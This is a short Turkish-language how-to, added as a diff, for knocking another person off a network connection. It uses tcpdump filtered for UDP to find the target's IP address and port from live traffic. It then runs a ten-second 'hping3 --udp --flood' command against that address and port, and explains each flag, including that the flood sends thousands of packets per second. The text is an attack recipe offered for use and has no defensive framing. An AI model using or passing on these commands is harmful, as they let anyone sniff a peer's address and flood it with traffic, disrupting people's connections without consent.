@@ -1,0 +1,9 @@
+İlk önce kişinin IP Adresini ve Bağlantı Portunu görüntülemek için "sudo tcpdump -ni enp2s0 | grep UDP" komutunu giriyoruz.
+(Örneğin ; 185.111.246.139.49320 şeklinde IP ve Port Numarası gözükecek, yani burada 185.111.246.139 kısmı IP adresi, 49320'de bağlantı portudur)
+
+Hemen ardından;
+
+"timeout 10 hping3 --udp -p 10000 --destport 49320 --flood 185.111.246.139" komutunu giriyoruz.
+(Burada "timeout 10" on saniye çalışması için, "--udp" paket türünü belirlemek için, "p 10000" bizim source portumuz bunu sallayabiliriz, "--flood" komutu da saniyede binlerce gönderim yapması için)
+
+Not: Bunları yapabilmek için tcpdump ve hping adlı paketlerin yüklü olması gereklidir.
